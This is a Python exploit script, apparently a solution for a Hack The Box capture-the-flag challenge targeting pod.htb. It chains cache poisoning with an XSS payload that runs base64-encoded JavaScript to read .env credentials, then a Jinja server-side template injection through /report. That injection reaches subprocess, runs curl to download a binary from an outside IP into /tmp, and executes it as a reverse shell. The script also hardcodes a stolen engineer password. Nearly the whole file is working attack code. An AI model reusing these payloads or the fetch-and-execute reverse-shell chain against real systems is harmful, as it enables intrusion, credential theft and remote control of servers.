#!/usr/bin/python3.11

import requests
import urllib.parse
from urllib.parse import quote_plus
import base64
from time import sleep

TARGET = "http://pod.htb:1337"
# TARGET = "http://pod.htb:43432"

############################################################################################
# Step 1 = get .env credentials                                                            #
# Step 2 = get rce via /reports                                                            #
isStepOne = False                                                                          #
############################################################################################

def poison_cache():
    print("[*] Sending cache poisoning request with browser-like headers...")
    url = f"{TARGET}/stats?period=1m&period={ENCODED_PAYLOAD}"
    r = requests.get(url)
    print(f"[+] Poisoning response: {r.status_code}")
    print(f"[+] Body: {r.text[:200]}...")

def call_for_pdf():
    print("[*] Trigger pdf...")
    url = f"{TARGET}/generate-report"
    r = requests.get(url)
    print(f"[+] Pdf response: {r.status_code}")

def submit_rce_report():
    print("[*] Submitting RCE payload via /report...")
    dropper_payload = {
        "title": "trigger",
        "description": "{% block body %}{% endblock %} {{ dict.__mro__[1].__subclasses__()[337](['bash','-c','curl -s http://139.162.184.70:7001/revbin -o /tmp/revbin && chmod +x /tmp/revbin']) }}",
        "file_path": "/app/services/web/templates/_template.html"
    }

    rev_shell_payload = {
        "title": "trigger",
        "description": "{% block body %}{% endblock %} {{ dict.__mro__[1].__subclasses__()[337](['/tmp/revbin']) }}",
        "file_path": "/app/services/web/templates/_template.html"
    }
    
    auth_header = base64.b64encode(f"{engineer_username}:{engineer_password}".encode()).decode()
    headers = {
        "Authorization": f"Basic {auth_header}",
        "Content-Type": "application/json"
    }
    r = requests.post(f"{TARGET}/report", json=rev_shell_payload, headers=headers)
    print(f"[+] Report submission response: {r.status_code} | {r.text}")
    
    print("[*] Triggering template eval loop...")
    sleep(2)
    res = requests.get(f"{TARGET}/")
    
    while True:
        try:
            print("[*] Triggering template eval loop...")
            
            if "HTB{" in res.text:
                print("[+] FLAG or SHELL TRIGGERED! Check your listener!")
                break
        except Exception as e:
            print(f"[!] Error hitting index: {e}")
        sleep(2)

if __name__ == "__main__":
    if isStepOne:
        step_one_read_credentials = "read_file.js"
        with open(step_one_read_credentials, "r") as f:
            b64_js = base64.b64encode(f.read().encode()).decode()

        RAW_PAYLOAD = f'<img src=x onerror=eval(atob("{b64_js}"))>'
        ENCODED_PAYLOAD = quote_plus(RAW_PAYLOAD, safe='()')
        
        poison_cache()
        sleep(2)
        call_for_pdf()
    else:
        engineer_username = "engineer"
        engineer_password = "HGXlBE9suOZudqAo9oNXOf4QDSdISToW"
        submit_rce_report()
